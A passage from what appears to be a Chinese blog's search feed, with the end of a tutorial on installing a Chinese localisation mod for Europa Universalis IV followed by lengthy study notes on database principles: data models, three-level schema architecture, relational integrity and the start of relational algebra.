start="3"><li>解压汉化mod得到四个文件，红色为汉化Mod文件（基础包），蓝色为汉化补丁文件（汉化补充包，增加了人名、动态地名、君主名及舰船名称等汉化，需搭配基础包使用，启用后无法获得成就。）</li></ol><p><img src="https://cos.gjcloak.xyz/pigo/202308021012090.webp?imageMogr2/format/webp/interlace/1/quality/0" alt="汉化解压情况">  </p><ol start="4"><li><p>把解压后的汉化mod文件放入 <mark class="hl-label Interactive\Europa">我的文档\Paradox</mark>  中<br><img src="https://cos.gjcloak.xyz/file/%E6%B1%89%E5%8C%96%E6%94%BE%E5%85%A5.png" alt="汉化放入">  </p></li><li><p>解压双子节文件，并把双子节解压后所有文件复制到游戏根目录（根目录即游戏安装目录）下<br><img src="https://cos.gjcloak.xyz/file/%E5%8F%8C%E5%AD%90%E8%8A%82%E8%A1%A5%E4%B8%81%E8%A7%A3%E5%8E%8B%E6%83%85%E5%86%B5.png" alt="双子节补丁解压情况">  </p></li><li><p>再次启动游戏，点击mod选项卡，启用汉化mod，最后点击开始游戏，就可以开始你的征程了。</p></li></ol><p><img src="https://cos.gjcloak.xyz/file/%E5%90%AF%E5%8A%A8%E5%99%A8%E9%80%89mod.png" alt="启动器选mod"></p><p><img src="https://cos.gjcloak.xyz/file/%E6%89%93%E5%BC%80mod.png" alt="打开mod"></p><p><img src="https://cos.gjcloak.xyz/file/%E5%90%AF%E7%94%A8.png" alt="启用"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>如果觉得拖沓，可以直接去看52pcgame上的汉化使用方法，虽然是1.28的，但步骤流程还是一样的。后面追加一下最新工坊的说明和使用</p><p><img src="https://cos.gjcloak.xyz/file/%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.png" alt="使用方法">  </p><p><img src="https://cos.gjcloak.xyz/file/%E6%95%99%E7%A8%8B.png" alt="教程">  </p><p><img src="https://cos.gjcloak.xyz/file/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98.png" alt="常见问题"></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 教程 </tag>
            
            <tag> mod </tag>
            
            <tag> 汉化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库原理及应用</title>
      <link href="/51.html"/>
      <url>/51.html</url>
      
        <content type="html"><![CDATA[<h2 id="第一章-引言"><a href="#第一章-引言" class="headerlink" title="第一章 引言"></a>第一章 引言</h2><h3 id="1-1-数据库系统概述"><a href="#1-1-数据库系统概述" class="headerlink" title="1.1 数据库系统概述"></a>1.1 数据库系统概述</h3><h4 id="1-1-1-数据库的四个基本概念"><a href="#1-1-1-数据库的四个基本概念" class="headerlink" title="1.1.1 数据库的四个基本概念"></a>1.1.1 数据库的四个基本概念</h4><p><img src="https://cos.gjcloak.xyz/NoteBook/20200509105522.png" alt="数据库的四个基本概念" title="数据库的四个基本概念"></p><p>1 数据（Data）</p><ul><li><p>数据是数据库中存储的基本对象</p></li><li><p>数据的定义：描述事物的符号记录</p></li><li><p>数据的种类：文本、图形、图像、音频、视频、学生的档案记录、货物的运输情况等</p></li><li><p>数据的特点：数据与其语义是不可分的（说明：数据的含义称为数据的语义，数据与其语义是不可分的。）</p></li><li><p>数据举例 1：</p><ul><li>例如 93 是一个数据</li><li>语义1：学生某门课的成绩</li><li>语义2：某人的体重</li><li>语义3：某个年级的学生人数</li><li>语义n：…</li></ul></li><li><p>数据举例 2：</p><ul><li>学生档案中的学生记录（李明，男，197205，江苏南京市，计算机系，1990）</li><li>语义：学生姓名、性别、出生年月、籍贯、所在院系、入学时间</li><li>解释：李明是个大学生，1972年5月出生，江苏南京市人，1990年考入计算机系</li></ul></li></ul><p>2 数据库（DataBase，简称 DB）</p><ul><li><p>数据库的定义：数据库（Database，简称 DB）是长期储存在计算机内、有组织的、可共享的大量数据的集合。（一个大规模集成的数据集合。）</p></li><li><p>数据库的基本特征：</p><ul><li>数据按一定的数据模型组织、描述和储存</li><li>可为各种用户共享</li><li>冗余度较小</li><li>数据独立性较高</li><li>易扩展</li></ul></li><li><p>数据库作用：</p><ul><li><p>一个数据库是对现实生活中一个企业或一个单位在计算机中的建模结果</p><ul><li>实体</li><li>联系（实体间的关系）</li></ul></li></ul></li></ul><p>3 数据库管理系统（DataBase Management System，简称 DBMS）</p><ul><li><p>DBMS 的定义：是位于用户与操作系统之间的一层数据管理软件。数据库管理系统和操作系统一样是计算机的基础软件，也是一个大型复杂的软件系统。</p></li><li><p>DBMS 的用途：数据库管理系统的主要任务就是科学地组织和存储数据、高效地获取和维护数据</p></li><li><p>DBMS 的主要功能</p><ul><li><p><strong>数据定义功能</strong></p><ul><li>提供数据定义语言（DDL）</li><li>定义数据库中的数据对象</li></ul></li><li><p><strong>数据组织、存储和管理</strong></p><ul><li>分类组织、存储和管理各种数据</li><li>确定组织数据的文件结构和存取方式</li><li>实现数据之间的联系</li><li>提供多种存取方法提高存取效率</li></ul></li><li><p><strong>数据操纵功能</strong></p><ul><li>提供数据操纵语言（DML）</li><li>实现对数据库的基本操作 CRUD (查询、插入、删除和修改)</li></ul></li><li><p><strong>数据库的事务管理和运行管理</strong></p><ul><li>数据库在建立、运行和维护时由 DBMS 统一管理和控制，保证事务的正确性</li><li>保证数据的安全性、完整性、多用户对数据的并发使用</li><li>发生故障后的系统恢复</li></ul></li><li><p><strong>数据库的建立和维护功能（实用程序）</strong></p><ul><li>数据库初始数据装载转换</li><li>数据库转储</li><li>介质故障恢复</li><li>数据库的重组织</li><li>性能监视分析等</li></ul></li><li><p><strong>其它功能</strong></p><ul><li>DBMS 与网络中其它软件系统的通信</li><li>两个 DBMS 系统的数据转换</li><li>异构数据库之间的互访和互操作</li></ul></li></ul></li></ul><p>4 数据库系统（Database System，简称 DBS）</p><ul><li><p>数据库系统的定义：在计算机系统中引入数据库后的系统构成数据库系统。</p></li><li><p>数据库系统的构成</p><ul><li>数据库</li><li>数据库管理系统（及其开发工具）</li><li>应用系统</li><li>数据库管理员 (DBA)：是负责数据库的设计、规划、协调的专职人员。是全面负责建立、维护和管理数据库系统的人员。</li></ul></li></ul><p><img src="https://cos.gjcloak.xyz/NoteBook/20200509110354.png" alt="数据库系统层次结构" title="数据库系统层次结构"></p><p>下面附一张各种人员的数据视图，知道即可：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200509144002.png" alt="各种人员的数据视图" title="各种人员的数据视图"></p><h4 id="1-1-2-数据管理技术的产生和发展"><a href="#1-1-2-数据管理技术的产生和发展" class="headerlink" title="1.1.2 数据管理技术的产生和发展"></a>1.1.2 数据管理技术的产生和发展</h4><p>1 什么是数据管理</p><p>数据管理是对数据进行分类、组织、编码、存储、检索和维护，也是数据处理的中心问题。</p><p>2 数据管理技术的发展过程</p><ul><li>人工管理阶段（20 世纪 40 年代中 —— 50 年代中）</li><li>文件系统阶段（20 世纪 50 年代末 —— 60 年代中）</li><li>数据库系统阶段（20 世纪 60 年代末 —— 现在）</li></ul><h4 id="1-1-3-数据库系统的特点"><a href="#1-1-3-数据库系统的特点" class="headerlink" title="1.1.3 数据库系统的特点"></a>1.1.3 数据库系统的特点</h4><ul><li><p><strong>数据结构化</strong></p><ul><li>数据库的主要特征之一，也是数据库系统与文件系统的本质区别</li></ul></li><li><p><strong>数据的共享性高，冗余度低，易扩充</strong></p><ul><li><p>数据共享的好处：</p><ul><li>减少数据冗余，节约存储空间</li><li>避免数据之间的不相容性与不一致性</li><li>使系统易于扩充</li></ul></li></ul></li><li><p><strong>数据独立性高</strong></p><ul><li>物理独立性：指用户的应用程序与存储在磁盘上的数据库中数据是相互独立的。当数据的物理存储改变了，应用程序不用改变。</li><li>逻辑独立性：指用户的应用程序与数据库的逻辑结构是相互独立的。数据的逻辑结构改变了，用户程序也可以不变。</li><li>数据独立性是由 DBMS 的二级映像功能来保证的</li></ul></li><li><p><strong>数据由 DBMS 统一管理和控制</strong></p><p>DBMS 提供以下几方面的数据控制功能</p><ul><li>数据的安全性（Security）保护：保护数据，以防止不合法的使用造成的数据的泄密和破坏。</li><li>数据的完整性（Integrity）检查：将数据控制在有效的范围内，或保证数据之间满足一定的关系。</li><li>并发（Concurrency）控制：对多用户的并发操作加以控制和协调，防止相互干扰而得到错误的结果。</li><li>数据库恢复（Recovery）：DBMS 必须具有将数据库从错误状态恢复到某一正确状态的功能</li></ul></li></ul><p>{cat_tips_A}数据库系统阶段应用程序与数据的对应关系（数据库系统）{&#x2F;cat_tips_A}</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200509115702.png" alt="应用程序与数据的对应关系" title="应用程序与数据的对应关系"></p><h3 id="1-2-数据模型"><a href="#1-2-数据模型" class="headerlink" title="1.2 数据模型"></a>1.2 数据模型</h3><p>在数据库中使用<strong>数据模型</strong>这个工具来抽象、表示和处理现实世界中的数据和信息，通俗地来讲，<strong>数据模型就是现实世界的模拟</strong>。</p><p>数据模型应满足三方面要求：</p><ul><li>能比较真实地模拟现实世界</li><li>容易为人所理解</li><li>便于在计算机上实现</li></ul><h4 id="1-2-1-两类数据模型"><a href="#1-2-1-两类数据模型" class="headerlink" title="1.2.1 两类数据模型"></a>1.2.1 两类数据模型</h4><p>数据模型分为两类（分属两个不同的层次）</p><h5 id="①-概念模型"><a href="#①-概念模型" class="headerlink" title="① 概念模型"></a>① 概念模型</h5><p>概念模型，也称信息模型，它是按用户的观点来对数据和信息建模，用于数据库设计。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200509121142.png" alt="现实世界中客观对象的抽象过程" title="现实世界中客观对象的抽象过程"></p><p>涉及的概念：</p><ul><li><p><strong>实体（Entity）：</strong>客观存在并可相互区别的事物，比如一个学生，一门课，学生的一次选课</p></li><li><p><strong>属性（Attribute）：</strong>实体所具有的某一特性，比如学生的身高，一个实体可以由若干个属性来刻画。</p></li><li><p><strong>码（Key） ：</strong>唯一标识实体的属性集，比如学生的学号</p></li><li><p><strong>域（Domain）：</strong>属性的取值范围称为该属性的域。</p></li><li><p><strong>实体型（Entity Type）：</strong> 实体名 + 属性名，比如 学生（学号，姓名，性别）就是一个实体型</p></li><li><p><strong>实体集（Entity Set）：</strong>同一类型的实体的集合，比如全体学生</p></li><li><p><strong>联系（Relationship） ：</strong>现实世界中事物内部以及事物之间的联系在信息中反映为实体内部的联系和实体之间的联系。</p><ul><li>实体内部的联系通常是指组成实体的各属性之间的联系</li><li>实体之间的联系通常是指不同实体集之间的联系，（有一对一，一对多，多对多等多种类型），<strong>实体之间的联系可用 E - R 图 表示</strong></li></ul></li></ul><p>一个实例：</p><p><strong>用 E - R 图表示某个工厂物资管理的概念模型</strong></p><ul><li><p>实体：</p><ul><li>仓库： 仓库号、面积、电话号码</li><li>零件 ：零件号、名称、规格、单价、描述</li><li>供应商：供应商号、姓名、地址、电话号码、帐号</li><li>项目：项目号、预算、开工日期</li><li>职工：职工号、姓名、年龄、职称</li></ul></li><li><p>完整的 E - R 图</p></li></ul><p><img src="https://cos.gjcloak.xyz/NoteBook/20200509122826.png" alt="完整的 E - R 图" title="完整的 E - R 图"></p><h5 id="②-逻辑模型和物理模型"><a href="#②-逻辑模型和物理模型" class="headerlink" title="② 逻辑模型和物理模型"></a>② 逻辑模型和物理模型</h5><p>逻辑模型主要包括网状模型、层次模型、关系模型、面向对象模型等，按计算机系统的观点对数据建模，用于 DBMS 实现。</p><p>物理模型是对数据最底层的抽象，描述数据在系统内部的表示方式和存取方法，在磁盘或磁带上的存储方式和存取方法。</p><ul><li><p>层次模型：层次模型用树形结构来表示各类实体以及实体间的联系。</p><p>满足下面两个条件的基本层次联系的集合为层次模型：</p><ul><li>有且只有一个结点没有双亲结点，这个结点称为根结点</li><li>根以外的其它结点有且只有一个双亲结点</li></ul></li><li><p>网状模型</p><p>满足下面两个条件的基本层次联系的集合为网状模型：</p><ul><li>允许一个以上的结点无双亲</li><li>一个结点可以有多于一个的双亲</li></ul></li><li><p><strong>关系模型</strong>：关系数据库系统采用关系模型作为数据的组织方式</p></li><li><p>面向对象数据模型</p></li><li><p>对象关系数据模型</p></li><li><p>半结构化数据模型</p></li></ul><p>{cat_tips_A}由于计算机厂商新推出的数据库管理系统几乎都支持关系模型，所以下面重点来说说关系模型！{&#x2F;cat_tips_A}</p><h4 id="1-2-2-关系模型"><a href="#1-2-2-关系模型" class="headerlink" title="1.2.2 关系模型"></a>1.2.2 关系模型</h4><p>关系模型是最重要的一种数据模型。</p><p>在用户观点下，关系模型由一组关系组成，每个关系的数据结构是一张规范化的二维表，它由行（元组）和列（属性）组成。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200509123934.png" alt="关系表" title="关系表"></p><p>关系模型相关的术语：</p><ul><li>关系（Relation）：一个关系对应一张表</li><li>元组（Tuple）：表中的一行即一个元组</li><li>属性（Attribute）：表中的一列即一个属性，给每一个属性起一个名称即属性名</li><li>主码（Key） ：表中的某个属性组，可以唯一确定一个元组，该属性组就称为主码。比如上表中的学号就就是该关系的主码</li><li>域（Domain）：域是一组具有相同数据类型的值的集合。比如人的年龄是1-120岁，属性的取值范围来自该属性对应的域</li><li>分量：元组中的一个属性值。</li><li>关系模式：对关系的描述，一般表示为 关系名（属性名1，属性名2….）。比如学生（学号，姓名，年龄，性别，系，年级）。关系模式必须是规范化的，不允许表中还有表，每个属性都应该是不可分的（即关系的每一个分量必须是一个不可分的数据项）</li></ul><h3 id="1-3-数据库系统结构"><a href="#1-3-数据库系统结构" class="headerlink" title="1.3 数据库系统结构"></a>1.3 数据库系统结构</h3><ul><li><p>从<strong>数据库最终用户角度</strong>看（数据库系统外部的体系结构） ，数据库系统的结构分为：</p><ul><li>单用户结构</li><li>主从式结构</li><li>客户／服务器</li><li>浏览器／应用服务器／数据库服务器多层结构等</li></ul></li><li><p>从<strong>数据库管理系统角度</strong>看，数据库系统通常采用三级模式结构，是数据库系统内部的系统结构</p></li></ul><h4 id="1-3-1-数据库系统模式的概念"><a href="#1-3-1-数据库系统模式的概念" class="headerlink" title="1.3.1 数据库系统模式的概念"></a>1.3.1 数据库系统模式的概念</h4><p>1 型和值的概念</p><ul><li>型（Type）：对某一类数据的结构和属性的说明</li><li>值（Value）：是型的一个具体赋值</li></ul><p>举例：</p><p>学生记录型：（学号，姓名，性别，系别，年龄，籍贯）</p><p>一个记录值：（900201，李明，男，计算机，22，江苏</p><p>2 模式（Schema）</p><ul><li>数据库逻辑结构和特征的描述</li><li>是型的描述</li><li>反映的是数据的结构及其联系</li><li>模式是相对稳定的</li></ul><p>3 实例（Instance）</p><ul><li>模式的一个具体值</li><li>反映数据库某一时刻的状态</li><li>同一个模式可以有很多实例</li><li>实例随数据库中的数据的更新而变动</li></ul><h4 id="1-3-2-数据库系统的三级模式结构"><a href="#1-3-2-数据库系统的三级模式结构" class="headerlink" title="1.3.2 数据库系统的三级模式结构"></a>1.3.2 数据库系统的三级模式结构</h4><p><img src="https://cos.gjcloak.xyz/NoteBook/20200509141539.png" alt="数据库系统的三级模式结构" title="数据库系统的三级模式结构"></p><h5 id="①-模式（Schema）"><a href="#①-模式（Schema）" class="headerlink" title="① 模式（Schema）"></a>① 模式（Schema）</h5><p>模式（也称逻辑模式）：数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图，综合了所有用户的需求</p><p>注：一个数据库只有一个模式，模式的地位是数据库系统模式结构的中间层，与数据的物理存储细节和硬件环境无关，与具体的应用程序、开发工具及高级程序设计语言无关</p><h5 id="②-外模式（External-Schema）"><a href="#②-外模式（External-Schema）" class="headerlink" title="② 外模式（External Schema）"></a>② 外模式（External Schema）</h5><p>外模式（也称子模式或用户模式）：是数据库用户（包括应用程序员和最终用户）使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示</p><p>注：外模式的地位：介于模式与应用之间</p><p>模式与外模式的关系：一对多</p><ul><li>外模式通常是模式的子集</li><li><strong>一个数据库可以有多个外模式</strong>。反映了不同的用户的应用需求、看待数据的方式、对数据保密的要求</li><li>对模式中同一数据，在外模式中的结构、类型、长度、保密级别等都可以不同</li></ul><p>外模式与应用的关系：一对多</p><ul><li>同一外模式也可以为某一用户的多个应用系统所使用</li><li>但一个应用程序只能使用一个外模式</li></ul><p>{cat_tips_A}外模式是保证数据库安全的一个有力措施。每个用户只能看见和访问对应的外模式中的数据，数据库的其余数据是不可见的{&#x2F;cat_tips_A}</p><h5 id="③-内模式（Internal-Schema）"><a href="#③-内模式（Internal-Schema）" class="headerlink" title="③ 内模式（Internal Schema）"></a>③ 内模式（Internal Schema）</h5><p>内模式（也称存储模式）：是数据物理结构和存储方式的描述，是数据在数据库内部的表示方式。</p><p>注：一个数据库只有一个内模式</p><p>数据在数据库内部的表示方式:</p><ul><li>记录的存储方式（顺序存储，按照B树结构存储，<br>按hash方法存储）</li><li>索引的组织方式</li><li>数据是否压缩存储</li><li>数据是否加密</li><li>数据存储记录结构的规定</li></ul><p>{cat_tips_A}最后再来回顾一下数据库系统的三级模式结构{&#x2F;cat_tips_A}</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200509142722.png" alt="数据库系统的三级模式结构" title="数据库系统的三级模式结构"></p><h4 id="1-3-3-数据库的二级映像功能与数据独立性"><a href="#1-3-3-数据库的二级映像功能与数据独立性" class="headerlink" title="1.3.3 数据库的二级映像功能与数据独立性"></a>1.3.3 数据库的二级映像功能与数据独立性</h4><ul><li><p>三级模式是对数据的三个抽象级别</p></li><li><p>二级映象在 DBMS 内部实现这三个抽象层次的联系和转换</p><ul><li>外模式／模式映像</li><li>模式／内模式映像</li></ul></li></ul><h2 id="第二章-关系数据库"><a href="#第二章-关系数据库" class="headerlink" title="第二章 关系数据库"></a>第二章 关系数据库</h2><h3 id="2-1-关系模型的基本术语及形式化定义"><a href="#2-1-关系模型的基本术语及形式化定义" class="headerlink" title="2.1 关系模型的基本术语及形式化定义"></a>2.1 关系模型的基本术语及形式化定义</h3><ul><li>数据结构 —— 静态特性</li><li>数据操作 —— 动态特性</li><li>数据的约束条件</li></ul><p><strong>数据结构</strong></p><p>1 数据结构：描述数据库的组成对象，以及对象之间的联系</p><p>2 两类对象：</p><ul><li>与数据类型、内容、性质有关的对象</li><li>与数据之间联系有关的对象</li></ul><p>3 数据结构是对系统静态特性的描述</p><p><strong>数据操作</strong></p><p>1 数据操作：对数据库中各种对象（型）的实例（值）允许执行的操作及有关的操作规则</p><p>2 数据操作的类型</p><ul><li>检索</li><li>更新（包括插入、删除、修改）</li></ul><p>3 数据模型对操作的定义</p><ul><li>操作的确切含义</li><li>操作符号</li><li>操作规则（如优先级）</li><li>实现操作的语言</li></ul><p>4 数据操作是对系统动态特性的描述。</p><p><strong>数据的完整性约束条件</strong></p><p>1 数据的完整性约束条件</p><ul><li>一组完整性规则的集合。</li><li>完整性规则：是给定的数据模型中数据及其联系所具有的制约和储存规则</li><li>用以限定符合数据模型的数据库状态以及状态的变化，来保证数据的正确、有效、相容。</li></ul><p>2 数据模型对约束条件的定义</p><ul><li>反映和规定本数据模型必须遵守的基本的通用的完整性约束条件。例如在关系模型中，任何关系必须满足实体完整性和参照完整性两个条件。</li><li>提供定义完整性约束条件的机制，以反映具体应用所涉及的数据必须遵守的特定的语义约束条件。</li></ul><h4 id="2-1-1-基本术语"><a href="#2-1-1-基本术语" class="headerlink" title="2.1.1 基本术语"></a>2.1.1 基本术语</h4><h5 id="1-域-Domain"><a href="#1-域-Domain" class="headerlink" title="1 域 Domain"></a>1 域 Domain</h5><p>一组具有相同数据类型的值的集合。</p><p>比如整数、字符串等。</p><h5 id="2-笛卡尔积-Cartesian-Product"><a href="#2-笛卡尔积-Cartesian-Product" class="headerlink" title="2 笛卡尔积 Cartesian Product"></a>2 笛卡尔积 Cartesian Product</h5><p>笛卡尔积是域上的一种集合运算</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513171338.png"></p><p>定义有点晦涩，看下面一个例子就懂了</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513171418.png"></p><h5 id="3-关系-Relation"><a href="#3-关系-Relation" class="headerlink" title="3 关系 Relation"></a>3 关系 Relation</h5><p>笛卡尔积 D1×D2×…×Dn 的一个子集叫作域 D1, D2, …, Dn 上的一个关系。</p><p>学生（学号，姓名，年级）就是一个关系</p><p>如果只有 1 个属性，则称为<strong>单元关系&#x2F;一元关系</strong></p><p>如果有 2 个属性，则称为<strong>二元关系</strong></p><h5 id="4-主码-Primary-Key"><a href="#4-主码-Primary-Key" class="headerlink" title="4 主码 Primary Key"></a>4 主码 Primary Key</h5><p>有一个或一组这样的属性，它的值能确定该关系中其他所有属性的值。</p><h5 id="5-候选码-Candidate-Key"><a href="#5-候选码-Candidate-Key" class="headerlink" title="5 候选码 Candidate Key"></a>5 候选码 Candidate Key</h5><p>能唯一标识元组的属性(组)，其中选择其一作为主码。</p><h5 id="6-主属性-Prime-Attribute"><a href="#6-主属性-Prime-Attribute" class="headerlink" title="6 主属性 Prime Attribute"></a>6 主属性 Prime Attribute</h5><p>候选码中的诸属性。</p><h5 id="7-非主属性-Non-Key-Attribute"><a href="#7-非主属性-Non-Key-Attribute" class="headerlink" title="7 非主属性 Non-Key Attribute"></a>7 非主属性 Non-Key Attribute</h5><p>不出现在任何候选码中的属性。</p><h5 id="8-关系的型与值"><a href="#8-关系的型与值" class="headerlink" title="8 关系的型与值"></a>8 关系的型与值</h5><p>关系(表)的型：关系的结构(字段名、字段个数、域等)</p><p>关系(表)的值：关系中具体的元组，也称关系的实例(Instance)。</p><h4 id="2-1-2-关系的概念及性质"><a href="#2-1-2-关系的概念及性质" class="headerlink" title="2.1.2 关系的概念及性质"></a>2.1.2 关系的概念及性质</h4><p>关系 Relation：笛卡尔积 D1×D2×…×Dn 的一个子集叫作域 D1, D2, …, Dn 上的一个关系。</p><p>学生（学号，姓名，年级）就是一个关系</p><p>如果只有 1 个属性，则称为<strong>单元关系&#x2F;一元关系</strong></p><p>如果有 2 个属性，则称为<strong>二元关系</strong></p><h4 id="2-1-3-关系模式"><a href="#2-1-3-关系模式" class="headerlink" title="2.1.3 关系模式"></a>2.1.3 关系模式</h4><p>关系数据库中，关系模式是型，关系是值 。</p><h5 id="1-什么是关系模式"><a href="#1-什么是关系模式" class="headerlink" title="1 什么是关系模式"></a>1 什么是关系模式</h5><ul><li><p>关系模式（Relation Schema）是型</p></li><li><p>关系是值</p></li><li><p>关系模式是对关系的描述</p><ul><li><p>元组集合的结构</p><ul><li>属性构成</li><li>属性来自的域</li><li>属性与域之间的映象关系</li></ul></li><li><p>元组语义以及完整性约束条件</p></li><li><p>属性间的数据依赖关系集合</p></li></ul></li></ul><h5 id="2-定义关系模式"><a href="#2-定义关系模式" class="headerlink" title="2 定义关系模式"></a>2 定义关系模式</h5><ul><li>关系的描述称为关系模式。</li><li>关系模式可以形式化地表示为：R（U，D，dom，F）</li></ul><p>说明：</p><p>R</p><p>关系名</p><p>U</p><p>组成该关系的属性名集合</p><p>D</p><p>属性组 U 中属性所来自的域</p><p>dom</p><p>属性向域的映象集合</p><p>F</p><p>属性间的数据依赖关系集合</p><ul><li><p>关系模式通常可以简记为：R (U) 或 R (A1，A2，…，An)</p><ul><li>R ——关系名</li><li>A1，A2，…，An ——属性名</li></ul></li></ul><p>!&gt; 注：域名及属性向域的映象常常直接说明为属性的类型、长度</p><h5 id="3-关系模式与关系"><a href="#3-关系模式与关系" class="headerlink" title="3 关系模式与关系"></a>3 关系模式与关系</h5><ul><li><p>关系模式</p><ul><li>对关系的描述</li><li>静态的、稳定的</li></ul></li><li><p>关系</p><ul><li>关系模式在某一时刻的状态或内容</li><li>动态的、随时间不断变化的</li></ul></li><li><p>关系模式和关系往往统称为关系，通过上下文加以区别</p></li></ul><h4 id="2-1-4-关系数据库"><a href="#2-1-4-关系数据库" class="headerlink" title="2.1.4 关系数据库"></a>2.1.4 关系数据库</h4><p>关系模型由关系数据结构、关系操作集合和关系完整性约束三部分组成。</p><p>（1）单一的数据结构—关系</p><p>关系模型的数据结构非常单一。在关系模型中，现实世界的实体以及实体间的各种联系均用关系来表示。在用户看来，关系模型中数据的逻辑结构是一张二维表。</p><p>（2）关系操作</p><p>关系模型中常用的关系操作包括：选择（Select）、投影（Project）、连接（Join）、除（Divide）、并（Union）、交(Intersection）、差（Difference）等和查询（Query）操作和增加（Insert）、删除（Delete）、修改（Update）操作两大部分。</p><p>（3）关系的三类完整牲约束</p><p>关系模型允许定义三类完整性约束：实体完整性、参照完整性和用户定义的完整性。</p><h3 id="2-2-关系的完整性"><a href="#2-2-关系的完整性" class="headerlink" title="2.2 关系的完整性"></a>2.2 关系的完整性</h3><p>关系模型中可以有三类完整性约束：实体完整性、参照完整性和用户定义完整性。</p><p>其中实体完整性和参照完整性是关系模型必须满足的完整性约束条件，被称作是关系的两个不变性，应该由关系系统自动支持。</p><p>关系模型的完整性规则是对关系的某种约束条件。任何关系在任何时刻都要满足这些语义约束</p><ul><li>实体完整性</li><li>参照完整性</li><li>用户定义完整性</li></ul><h4 id="2-2-1-实体完整性"><a href="#2-2-1-实体完整性" class="headerlink" title="2.2.1 实体完整性"></a>2.2.1 实体完整性</h4><h5 id="Entity-Integrity"><a href="#Entity-Integrity" class="headerlink" title="Entity Integrity"></a>Entity Integrity</h5><p>关系数据库中的每个元组应该是可区分的、唯一的。这样的约束条件用实体完整性来保证</p><p><strong>实体完整性规则：</strong>每个关系都应有至少一个主属性，且主属性不能为空值</p><p>例如：选修（学号，课程号，成绩）关系中，学号和课程号不能为空值</p><p>!&gt; 实体完整性规则规定基本关系的所有主属性都不能取空值，而不仅是主码整体不能取空值。</p><h4 id="2-2-2-参照完整性"><a href="#2-2-2-参照完整性" class="headerlink" title="2.2.2 参照完整性"></a>2.2.2 参照完整性</h4><h5 id="Referential-Integrity"><a href="#Referential-Integrity" class="headerlink" title="Referential Integrity"></a>Referential Integrity</h5><p><strong>参照完整性规则：</strong>若属性 F 是基本关系R的外码，它与基本关系 S 的主码 Ks 相对应，则对于 R 中每个元组在 F 上的值必须为：</p><ul><li>或者取空值</li><li>或者等于 S 中某个元组的主码值</li></ul><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513180104.png" alt="image-20200513180100165" title="image-20200513180100165"></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513180215.png" alt="image-20200513180213761" title="image-20200513180213761"></p><h4 id="2-2-3-用户定义完整性"><a href="#2-2-3-用户定义完整性" class="headerlink" title="2.2.3 用户定义完整性"></a>2.2.3 用户定义完整性</h4><h5 id="User-defined-Integrity"><a href="#User-defined-Integrity" class="headerlink" title="User-defined Integrity"></a>User-defined Integrity</h5><p>任何关系数据库系统都应支持实体完整性和参照完整性。除此之外，用户还可以自定义完整性约束。</p><p>用户定义的完整性是针对某一具体关系数据库的约束条件，反映某一具体应用所涉及的数据必须满足的语义要求。</p><p>例：选修（学号，课程号，成绩）成绩的取值范围在 0~100 之间</p><p>关系模型应提供定义和检验这类完整性的机制，以便用统一的系统的方法处理它们，而不要由应用程序承担这一功能。</p><h3 id="2-3-关系代数"><a href="#2-3-关系代数" class="headerlink" title="2.3 关系代数"></a>2.3 关系代数</h3><p>关系代数是一种抽象的查询语言，是关系数据操纵语言的一种传统表达方式，它是用对关系的运算来表达查询的。</p><p>关系代数的运算对象是关系，运算结果亦是关系</p><p>关系代数用到的运算符包括两类：集合运算符和专门的关系运算符</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513180929.png"></p><h4 id="2-3-1-传统的集合运算"><a href="#2-3-1-传统的集合运算" class="headerlink" title="2.3.1 传统的集合运算"></a>2.3.1 传统的集合运算</h4><p>传统的集合运算是二目运算，包括并、差、交、笛卡尔积 4 种运算</p><h5 id="①-并-Union"><a href="#①-并-Union" class="headerlink" title="① 并 Union"></a>① 并 Union</h5><p>关系 R 与关系 S 的并记作：<code>R ∪ S = &#123;tt∈R ∨ t∈S&#125;</code></p><p>其结果仍为 n 目关系，由属于 R 或属于 S 的元组组成。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513182050.png" alt="image-20200513182048845" title="image-20200513182048845"></p><p>例图：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513182206.png" alt="image-20200513182204587" title="image-20200513182204587"></p><h5 id="②-差-Difference"><a href="#②-差-Difference" class="headerlink" title="② 差 Difference"></a>② 差 Difference</h5><p>系R与关系S的差记作：<code>R - S = &#123;tt∈R ∧ tS&#125;</code></p><p>其结果关系仍为 n 目关系，由属于 R 而不属于 S 的所有元组组成。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513182448.png" alt="image-20200513182446997" title="image-20200513182446997"></p><p>例图：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513182542.png" alt="image-20200513182540567" title="image-20200513182540567"></p><h5 id="③-交-Intersection"><a href="#③-交-Intersection" class="headerlink" title="③ 交 Intersection"></a>③ 交 Intersection</h5><p>关系 R 与关系 S 的交记作：<code>R ∩ S = &#123;tt∈R ∧ t∈S&#125;</code></p><p>其结果关系仍为 n 目关系，由既属于 R 又属于 S 的元组组成。关系的交可以用差来表示，即 <code>R ∩ S = R-(R-S)</code></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513183830.png" alt="image-20200513183829377" title="image-20200513183829377"></p><p>例图：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513183948.png" alt="image-20200513183947250" title="image-20200513183947250"></p><h5 id="④笛卡尔积-Cartesian-Product"><a href="#④笛卡尔积-Cartesian-Product" class="headerlink" title="④笛卡尔积 Cartesian Product"></a>④笛卡尔积 Cartesian Product</h5><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513184638.png" 